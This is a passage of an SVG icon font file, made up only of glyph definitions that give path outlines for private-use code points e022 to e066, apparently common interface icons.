<glyph unicode="&#xe022;" d="M600 1200v-400q0 -41 29.5 -70.5t70.5 -29.5h300v-650q0 -21 -14.5 -35.5t-35.5 -14.5h-800q-21 0 -35.5 14.5t-14.5 35.5v1100q0 21 14.5 35.5t35.5 14.5h450zM1000 800h-250q-21 0 -35.5 14.5t-14.5 35.5v250z" />
<glyph unicode="&#xe023;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM600 1027q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5t57 -214.5 t155.5 -155.5t214.5 -57t214.5 57t155.5 155.5t57 214.5t-57 214.5t-155.5 155.5t-214.5 57zM525 900h50q10 0 17.5 -7.5t7.5 -17.5v-275h175q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v350q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe024;" d="M1300 0h-538l-41 400h-242l-41 -400h-538l431 1200h209l-21 -300h162l-20 300h208zM515 800l-27 -300h224l-27 300h-170z" />
<glyph unicode="&#xe025;" d="M550 1200h200q21 0 35.5 -14.5t14.5 -35.5v-450h191q20 0 25.5 -11.5t-7.5 -27.5l-327 -400q-13 -16 -32 -16t-32 16l-327 400q-13 16 -7.5 27.5t25.5 11.5h191v450q0 21 14.5 35.5t35.5 14.5zM1125 400h50q10 0 17.5 -7.5t7.5 -17.5v-350q0 -10 -7.5 -17.5t-17.5 -7.5 h-1050q-10 0 -17.5 7.5t-7.5 17.5v350q0 10 7.5 17.5t17.5 7.5h50q10 0 17.5 -7.5t7.5 -17.5v-175h900v175q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe026;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM600 1027q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5t57 -214.5 t155.5 -155.5t214.5 -57t214.5 57t155.5 155.5t57 214.5t-57 214.5t-155.5 155.5t-214.5 57zM525 900h150q10 0 17.5 -7.5t7.5 -17.5v-275h137q21 0 26 -11.5t-8 -27.5l-223 -275q-13 -16 -32 -16t-32 16l-223 275q-13 16 -8 27.5t26 11.5h137v275q0 10 7.5 17.5t17.5 7.5z " />
<glyph unicode="&#xe027;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM600 1027q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5t57 -214.5 t155.5 -155.5t214.5 -57t214.5 57t155.5 155.5t57 214.5t-57 214.5t-155.5 155.5t-214.5 57zM632 914l223 -275q13 -16 8 -27.5t-26 -11.5h-137v-275q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v275h-137q-21 0 -26 11.5t8 27.5l223 275q13 16 32 16 t32 -16z" />
<glyph unicode="&#xe028;" d="M225 1200h750q10 0 19.5 -7t12.5 -17l186 -652q7 -24 7 -49v-425q0 -12 -4 -27t-9 -17q-12 -6 -37 -6h-1100q-12 0 -27 4t-17 8q-6 13 -6 38l1 425q0 25 7 49l185 652q3 10 12.5 17t19.5 7zM878 1000h-556q-10 0 -19 -7t-11 -18l-87 -450q-2 -11 4 -18t16 -7h150 q10 0 19.5 -7t11.5 -17l38 -152q2 -10 11.5 -17t19.5 -7h250q10 0 19.5 7t11.5 17l38 152q2 10 11.5 17t19.5 7h150q10 0 16 7t4 18l-87 450q-2 11 -11 18t-19 7z" />
<glyph unicode="&#xe029;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM600 1027q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5t57 -214.5 t155.5 -155.5t214.5 -57t214.5 57t155.5 155.5t57 214.5t-57 214.5t-155.5 155.5t-214.5 57zM540 820l253 -190q17 -12 17 -30t-17 -30l-253 -190q-16 -12 -28 -6.5t-12 26.5v400q0 21 12 26.5t28 -6.5z" />
<glyph unicode="&#xe030;" d="M947 1060l135 135q7 7 12.5 5t5.5 -13v-362q0 -10 -7.5 -17.5t-17.5 -7.5h-362q-11 0 -13 5.5t5 12.5l133 133q-109 76 -238 76q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5t57 -214.5t155.5 -155.5t214.5 -57t214.5 57t155.5 155.5t57 214.5h150q0 -117 -45.5 -224 t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5q192 0 347 -117z" />
<glyph unicode="&#xe031;" d="M947 1060l135 135q7 7 12.5 5t5.5 -13v-361q0 -11 -7.5 -18.5t-18.5 -7.5h-361q-11 0 -13 5.5t5 12.5l134 134q-110 75 -239 75q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5h-150q0 117 45.5 224t123 184.5t184.5 123t224 45.5q192 0 347 -117zM1027 600h150 q0 -117 -45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5q-192 0 -348 118l-134 -134q-7 -8 -12.5 -5.5t-5.5 12.5v360q0 11 7.5 18.5t18.5 7.5h360q10 0 12.5 -5.5t-5.5 -12.5l-133 -133q110 -76 240 -76q116 0 214.5 57t155.5 155.5t57 214.5z" />
<glyph unicode="&#xe032;" d="M125 1200h1050q10 0 17.5 -7.5t7.5 -17.5v-1150q0 -10 -7.5 -17.5t-17.5 -7.5h-1050q-10 0 -17.5 7.5t-7.5 17.5v1150q0 10 7.5 17.5t17.5 7.5zM1075 1000h-850q-10 0 -17.5 -7.5t-7.5 -17.5v-850q0 -10 7.5 -17.5t17.5 -7.5h850q10 0 17.5 7.5t7.5 17.5v850 q0 10 -7.5 17.5t-17.5 7.5zM325 900h50q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-50q-10 0 -17.5 7.5t-7.5 17.5v50q0 10 7.5 17.5t17.5 7.5zM525 900h450q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-450q-10 0 -17.5 7.5t-7.5 17.5v50 q0 10 7.5 17.5t17.5 7.5zM325 700h50q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-50q-10 0 -17.5 7.5t-7.5 17.5v50q0 10 7.5 17.5t17.5 7.5zM525 700h450q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-450q-10 0 -17.5 7.5t-7.5 17.5v50 q0 10 7.5 17.5t17.5 7.5zM325 500h50q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-50q-10 0 -17.5 7.5t-7.5 17.5v50q0 10 7.5 17.5t17.5 7.5zM525 500h450q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-450q-10 0 -17.5 7.5t-7.5 17.5v50 q0 10 7.5 17.5t17.5 7.5zM325 300h50q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-50q-10 0 -17.5 7.5t-7.5 17.5v50q0 10 7.5 17.5t17.5 7.5zM525 300h450q10 0 17.5 -7.5t7.5 -17.5v-50q0 -10 -7.5 -17.5t-17.5 -7.5h-450q-10 0 -17.5 7.5t-7.5 17.5v50 q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe033;" d="M900 800v200q0 83 -58.5 141.5t-141.5 58.5h-300q-82 0 -141 -59t-59 -141v-200h-100q-41 0 -70.5 -29.5t-29.5 -70.5v-600q0 -41 29.5 -70.5t70.5 -29.5h900q41 0 70.5 29.5t29.5 70.5v600q0 41 -29.5 70.5t-70.5 29.5h-100zM400 800v150q0 21 15 35.5t35 14.5h200 q20 0 35 -14.5t15 -35.5v-150h-300z" />
<glyph unicode="&#xe034;" d="M125 1100h50q10 0 17.5 -7.5t7.5 -17.5v-1075h-100v1075q0 10 7.5 17.5t17.5 7.5zM1075 1052q4 0 9 -2q16 -6 16 -23v-421q0 -6 -3 -12q-33 -59 -66.5 -99t-65.5 -58t-56.5 -24.5t-52.5 -6.5q-26 0 -57.5 6.5t-52.5 13.5t-60 21q-41 15 -63 22.5t-57.5 15t-65.5 7.5 q-85 0 -160 -57q-7 -5 -15 -5q-6 0 -11 3q-14 7 -14 22v438q22 55 82 98.5t119 46.5q23 2 43 0.5t43 -7t32.5 -8.5t38 -13t32.5 -11q41 -14 63.5 -21t57 -14t63.5 -7q103 0 183 87q7 8 18 8z" />
<glyph unicode="&#xe035;" d="M600 1175q116 0 227 -49.5t192.5 -131t131 -192.5t49.5 -227v-300q0 -10 -7.5 -17.5t-17.5 -7.5h-50q-10 0 -17.5 7.5t-7.5 17.5v300q0 127 -70.5 231.5t-184.5 161.5t-245 57t-245 -57t-184.5 -161.5t-70.5 -231.5v-300q0 -10 -7.5 -17.5t-17.5 -7.5h-50 q-10 0 -17.5 7.5t-7.5 17.5v300q0 116 49.5 227t131 192.5t192.5 131t227 49.5zM220 500h160q8 0 14 -6t6 -14v-460q0 -8 -6 -14t-14 -6h-160q-8 0 -14 6t-6 14v460q0 8 6 14t14 6zM820 500h160q8 0 14 -6t6 -14v-460q0 -8 -6 -14t-14 -6h-160q-8 0 -14 6t-6 14v460 q0 8 6 14t14 6z" />
<glyph unicode="&#xe036;" d="M321 814l258 172q9 6 15 2.5t6 -13.5v-750q0 -10 -6 -13.5t-15 2.5l-258 172q-21 14 -46 14h-250q-10 0 -17.5 7.5t-7.5 17.5v350q0 10 7.5 17.5t17.5 7.5h250q25 0 46 14zM900 668l120 120q7 7 17 7t17 -7l34 -34q7 -7 7 -17t-7 -17l-120 -120l120 -120q7 -7 7 -17 t-7 -17l-34 -34q-7 -7 -17 -7t-17 7l-120 119l-120 -119q-7 -7 -17 -7t-17 7l-34 34q-7 7 -7 17t7 17l119 120l-119 120q-7 7 -7 17t7 17l34 34q7 8 17 8t17 -8z" />
<glyph unicode="&#xe037;" d="M321 814l258 172q9 6 15 2.5t6 -13.5v-750q0 -10 -6 -13.5t-15 2.5l-258 172q-21 14 -46 14h-250q-10 0 -17.5 7.5t-7.5 17.5v350q0 10 7.5 17.5t17.5 7.5h250q25 0 46 14zM766 900h4q10 -1 16 -10q96 -129 96 -290q0 -154 -90 -281q-6 -9 -17 -10l-3 -1q-9 0 -16 6 l-29 23q-7 7 -8.5 16.5t4.5 17.5q72 103 72 229q0 132 -78 238q-6 8 -4.5 18t9.5 17l29 22q7 5 15 5z" />
<glyph unicode="&#xe038;" d="M967 1004h3q11 -1 17 -10q135 -179 135 -396q0 -105 -34 -206.5t-98 -185.5q-7 -9 -17 -10h-3q-9 0 -16 6l-42 34q-8 6 -9 16t5 18q111 150 111 328q0 90 -29.5 176t-84.5 157q-6 9 -5 19t10 16l42 33q7 5 15 5zM321 814l258 172q9 6 15 2.5t6 -13.5v-750q0 -10 -6 -13.5 t-15 2.5l-258 172q-21 14 -46 14h-250q-10 0 -17.5 7.5t-7.5 17.5v350q0 10 7.5 17.5t17.5 7.5h250q25 0 46 14zM766 900h4q10 -1 16 -10q96 -129 96 -290q0 -154 -90 -281q-6 -9 -17 -10l-3 -1q-9 0 -16 6l-29 23q-7 7 -8.5 16.5t4.5 17.5q72 103 72 229q0 132 -78 238 q-6 8 -4.5 18.5t9.5 16.5l29 22q7 5 15 5z" />
<glyph unicode="&#xe039;" d="M500 900h100v-100h-100v-100h-400v-100h-100v600h500v-300zM1200 700h-200v-100h200v-200h-300v300h-200v300h-100v200h600v-500zM100 1100v-300h300v300h-300zM800 1100v-300h300v300h-300zM300 900h-100v100h100v-100zM1000 900h-100v100h100v-100zM300 500h200v-500 h-500v500h200v100h100v-100zM800 300h200v-100h-100v-100h-200v100h-100v100h100v200h-200v100h300v-300zM100 400v-300h300v300h-300zM300 200h-100v100h100v-100zM1200 200h-100v100h100v-100zM700 0h-100v100h100v-100zM1200 0h-300v100h300v-100z" />
<glyph unicode="&#xe040;" d="M100 200h-100v1000h100v-1000zM300 200h-100v1000h100v-1000zM700 200h-200v1000h200v-1000zM900 200h-100v1000h100v-1000zM1200 200h-200v1000h200v-1000zM400 0h-300v100h300v-100zM600 0h-100v91h100v-91zM800 0h-100v91h100v-91zM1100 0h-200v91h200v-91z" />
<glyph unicode="&#xe041;" d="M500 1200l682 -682q8 -8 8 -18t-8 -18l-464 -464q-8 -8 -18 -8t-18 8l-682 682l1 475q0 10 7.5 17.5t17.5 7.5h474zM319.5 1024.5q-29.5 29.5 -71 29.5t-71 -29.5t-29.5 -71.5t29.5 -71.5t71 -29.5t71 29.5t29.5 71.5t-29.5 71.5z" />
<glyph unicode="&#xe042;" d="M500 1200l682 -682q8 -8 8 -18t-8 -18l-464 -464q-8 -8 -18 -8t-18 8l-682 682l1 475q0 10 7.5 17.5t17.5 7.5h474zM800 1200l682 -682q8 -8 8 -18t-8 -18l-464 -464q-8 -8 -18 -8t-18 8l-56 56l424 426l-700 700h150zM319.5 1024.5q-29.5 29.5 -71 29.5t-71 -29.5 t-29.5 -71.5t29.5 -71.5t71 -29.5t71 29.5t29.5 71.5t-29.5 71.5z" />
<glyph unicode="&#xe043;" d="M300 1200h825q75 0 75 -75v-900q0 -25 -18 -43l-64 -64q-8 -8 -13 -5.5t-5 12.5v950q0 10 -7.5 17.5t-17.5 7.5h-700q-25 0 -43 -18l-64 -64q-8 -8 -5.5 -13t12.5 -5h700q10 0 17.5 -7.5t7.5 -17.5v-950q0 -10 -7.5 -17.5t-17.5 -7.5h-850q-10 0 -17.5 7.5t-7.5 17.5v975 q0 25 18 43l139 139q18 18 43 18z" />
<glyph unicode="&#xe044;" d="M250 1200h800q21 0 35.5 -14.5t14.5 -35.5v-1150l-450 444l-450 -445v1151q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe045;" d="M822 1200h-444q-11 0 -19 -7.5t-9 -17.5l-78 -301q-7 -24 7 -45l57 -108q6 -9 17.5 -15t21.5 -6h450q10 0 21.5 6t17.5 15l62 108q14 21 7 45l-83 301q-1 10 -9 17.5t-19 7.5zM1175 800h-150q-10 0 -21 -6.5t-15 -15.5l-78 -156q-4 -9 -15 -15.5t-21 -6.5h-550 q-10 0 -21 6.5t-15 15.5l-78 156q-4 9 -15 15.5t-21 6.5h-150q-10 0 -17.5 -7.5t-7.5 -17.5v-650q0 -10 7.5 -17.5t17.5 -7.5h150q10 0 17.5 7.5t7.5 17.5v150q0 10 7.5 17.5t17.5 7.5h750q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 7.5 -17.5t17.5 -7.5h150q10 0 17.5 7.5 t7.5 17.5v650q0 10 -7.5 17.5t-17.5 7.5zM850 200h-500q-10 0 -19.5 -7t-11.5 -17l-38 -152q-2 -10 3.5 -17t15.5 -7h600q10 0 15.5 7t3.5 17l-38 152q-2 10 -11.5 17t-19.5 7z" />
<glyph unicode="&#xe046;" d="M500 1100h200q56 0 102.5 -20.5t72.5 -50t44 -59t25 -50.5l6 -20h150q41 0 70.5 -29.5t29.5 -70.5v-600q0 -41 -29.5 -70.5t-70.5 -29.5h-1000q-41 0 -70.5 29.5t-29.5 70.5v600q0 41 29.5 70.5t70.5 29.5h150q2 8 6.5 21.5t24 48t45 61t72 48t102.5 21.5zM900 800v-100 h100v100h-100zM600 730q-95 0 -162.5 -67.5t-67.5 -162.5t67.5 -162.5t162.5 -67.5t162.5 67.5t67.5 162.5t-67.5 162.5t-162.5 67.5zM600 603q43 0 73 -30t30 -73t-30 -73t-73 -30t-73 30t-30 73t30 73t73 30z" />
<glyph unicode="&#xe047;" d="M681 1199l385 -998q20 -50 60 -92q18 -19 36.5 -29.5t27.5 -11.5l10 -2v-66h-417v66q53 0 75 43.5t5 88.5l-82 222h-391q-58 -145 -92 -234q-11 -34 -6.5 -57t25.5 -37t46 -20t55 -6v-66h-365v66q56 24 84 52q12 12 25 30.5t20 31.5l7 13l399 1006h93zM416 521h340 l-162 457z" />
<glyph unicode="&#xe048;" d="M753 641q5 -1 14.5 -4.5t36 -15.5t50.5 -26.5t53.5 -40t50.5 -54.5t35.5 -70t14.5 -87q0 -67 -27.5 -125.5t-71.5 -97.5t-98.5 -66.5t-108.5 -40.5t-102 -13h-500v89q41 7 70.5 32.5t29.5 65.5v827q0 24 -0.5 34t-3.5 24t-8.5 19.5t-17 13.5t-28 12.5t-42.5 11.5v71 l471 -1q57 0 115.5 -20.5t108 -57t80.5 -94t31 -124.5q0 -51 -15.5 -96.5t-38 -74.5t-45 -50.5t-38.5 -30.5zM400 700h139q78 0 130.5 48.5t52.5 122.5q0 41 -8.5 70.5t-29.5 55.5t-62.5 39.5t-103.5 13.5h-118v-350zM400 200h216q80 0 121 50.5t41 130.5q0 90 -62.5 154.5 t-156.5 64.5h-159v-400z" />
<glyph unicode="&#xe049;" d="M877 1200l2 -57q-83 -19 -116 -45.5t-40 -66.5l-132 -839q-9 -49 13 -69t96 -26v-97h-500v97q186 16 200 98l173 832q3 17 3 30t-1.5 22.5t-9 17.5t-13.5 12.5t-21.5 10t-26 8.5t-33.5 10q-13 3 -19 5v57h425z" />
<glyph unicode="&#xe050;" d="M1300 900h-50q0 21 -4 37t-9.5 26.5t-18 17.5t-22 11t-28.5 5.5t-31 2t-37 0.5h-200v-850q0 -22 25 -34.5t50 -13.5l25 -2v-100h-400v100q4 0 11 0.5t24 3t30 7t24 15t11 24.5v850h-200q-25 0 -37 -0.5t-31 -2t-28.5 -5.5t-22 -11t-18 -17.5t-9.5 -26.5t-4 -37h-50v300 h1000v-300zM175 1000h-75v-800h75l-125 -167l-125 167h75v800h-75l125 167z" />
<glyph unicode="&#xe051;" d="M1100 900h-50q0 21 -4 37t-9.5 26.5t-18 17.5t-22 11t-28.5 5.5t-31 2t-37 0.5h-200v-650q0 -22 25 -34.5t50 -13.5l25 -2v-100h-400v100q4 0 11 0.5t24 3t30 7t24 15t11 24.5v650h-200q-25 0 -37 -0.5t-31 -2t-28.5 -5.5t-22 -11t-18 -17.5t-9.5 -26.5t-4 -37h-50v300 h1000v-300zM1167 50l-167 -125v75h-800v-75l-167 125l167 125v-75h800v75z" />
<glyph unicode="&#xe052;" d="M50 1100h600q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-600q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 800h1000q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1000q-21 0 -35.5 14.5t-14.5 35.5v100 q0 21 14.5 35.5t35.5 14.5zM50 500h800q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-800q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 200h1100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1100 q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe053;" d="M250 1100h700q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-700q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 800h1100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1100q-21 0 -35.5 14.5t-14.5 35.5v100 q0 21 14.5 35.5t35.5 14.5zM250 500h700q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-700q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 200h1100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1100 q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe054;" d="M500 950v100q0 21 14.5 35.5t35.5 14.5h600q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-600q-21 0 -35.5 14.5t-14.5 35.5zM100 650v100q0 21 14.5 35.5t35.5 14.5h1000q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1000 q-21 0 -35.5 14.5t-14.5 35.5zM300 350v100q0 21 14.5 35.5t35.5 14.5h800q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-800q-21 0 -35.5 14.5t-14.5 35.5zM0 50v100q0 21 14.5 35.5t35.5 14.5h1100q21 0 35.5 -14.5t14.5 -35.5v-100 q0 -21 -14.5 -35.5t-35.5 -14.5h-1100q-21 0 -35.5 14.5t-14.5 35.5z" />
<glyph unicode="&#xe055;" d="M50 1100h1100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1100q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 800h1100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1100q-21 0 -35.5 14.5t-14.5 35.5v100 q0 21 14.5 35.5t35.5 14.5zM50 500h1100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1100q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 200h1100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1100 q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe056;" d="M50 1100h100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM350 1100h800q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-800q-21 0 -35.5 14.5t-14.5 35.5v100 q0 21 14.5 35.5t35.5 14.5zM50 800h100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM350 800h800q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-800 q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 500h100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM350 500h800q21 0 35.5 -14.5t14.5 -35.5v-100 q0 -21 -14.5 -35.5t-35.5 -14.5h-800q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 200h100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM350 200h800 q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-800q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe057;" d="M400 0h-100v1100h100v-1100zM550 1100h100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM550 800h500q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-500 q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM267 550l-167 -125v75h-200v100h200v75zM550 500h300q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-300q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM550 200h600 q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-600q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe058;" d="M50 1100h100q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM900 0h-100v1100h100v-1100zM50 800h500q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-500 q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM1100 600h200v-100h-200v-75l-167 125l167 125v-75zM50 500h300q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-300q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5zM50 200h600 q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-600q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe059;" d="M75 1000h750q31 0 53 -22t22 -53v-650q0 -31 -22 -53t-53 -22h-750q-31 0 -53 22t-22 53v650q0 31 22 53t53 22zM1200 300l-300 300l300 300v-600z" />
<glyph unicode="&#xe060;" d="M44 1100h1112q18 0 31 -13t13 -31v-1012q0 -18 -13 -31t-31 -13h-1112q-18 0 -31 13t-13 31v1012q0 18 13 31t31 13zM100 1000v-737l247 182l298 -131l-74 156l293 318l236 -288v500h-1000zM342 884q56 0 95 -39t39 -94.5t-39 -95t-95 -39.5t-95 39.5t-39 95t39 94.5 t95 39z" />
<glyph unicode="&#xe062;" d="M648 1169q117 0 216 -60t156.5 -161t57.5 -218q0 -115 -70 -258q-69 -109 -158 -225.5t-143 -179.5l-54 -62q-9 8 -25.5 24.5t-63.5 67.5t-91 103t-98.5 128t-95.5 148q-60 132 -60 249q0 88 34 169.5t91.5 142t137 96.5t166.5 36zM652.5 974q-91.5 0 -156.5 -65 t-65 -157t65 -156.5t156.5 -64.5t156.5 64.5t65 156.5t-65 157t-156.5 65z" />
<glyph unicode="&#xe063;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM600 173v854q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5t57 -214.5 t155.5 -155.5t214.5 -57z" />
<glyph unicode="&#xe064;" d="M554 1295q21 -72 57.5 -143.5t76 -130t83 -118t82.5 -117t70 -116t49.5 -126t18.5 -136.5q0 -71 -25.5 -135t-68.5 -111t-99 -82t-118.5 -54t-125.5 -23q-84 5 -161.5 34t-139.5 78.5t-99 125t-37 164.5q0 69 18 136.5t49.5 126.5t69.5 116.5t81.5 117.5t83.5 119 t76.5 131t58.5 143zM344 710q-23 -33 -43.5 -70.5t-40.5 -102.5t-17 -123q1 -37 14.5 -69.5t30 -52t41 -37t38.5 -24.5t33 -15q21 -7 32 -1t13 22l6 34q2 10 -2.5 22t-13.5 19q-5 4 -14 12t-29.5 40.5t-32.5 73.5q-26 89 6 271q2 11 -6 11q-8 1 -15 -10z" />
<glyph unicode="&#xe065;" d="M1000 1013l108 115q2 1 5 2t13 2t20.5 -1t25 -9.5t28.5 -21.5q22 -22 27 -43t0 -32l-6 -10l-108 -115zM350 1100h400q50 0 105 -13l-187 -187h-368q-41 0 -70.5 -29.5t-29.5 -70.5v-500q0 -41 29.5 -70.5t70.5 -29.5h500q41 0 70.5 29.5t29.5 70.5v182l200 200v-332 q0 -165 -93.5 -257.5t-256.5 -92.5h-400q-165 0 -257.5 92.5t-92.5 257.5v400q0 165 92.5 257.5t257.5 92.5zM1009 803l-362 -362l-161 -50l55 170l355 355z" />
<glyph unicode="&#xe066;" d="M350 1100h361q-164 -146 -216 -200h-195q-41 0 -70.5 -29.5t-29.5 -70.5v-500q0 -41 29.5 -70.5t70.5 -29.5h500q41 0 70.5 29.5t29.5 70.5l200 153v-103q0 -165 -92.5 -257.5t-257.5 -92.5h-400q-165 0 -257.5 92.5t-92.5 257.5v400q0 165 92.5 257.5t257.5 92.5z M824 1073l339 -301q8 -7 8 -17.5t-8 -17.5l-340 -306q-7 -6 -12.5 -4t-6.5 11v203q-26 1 -54.5 0t-78.5 -7.5t-92 -17.5t-86 -35t-70 -57q10 59 33 108t51.5 81.5t65 58.5t68.5 40.5t67 24.5t56 13.5t40 4.5v210q1 10 6.5 12.5t13.5 -4.5z" />
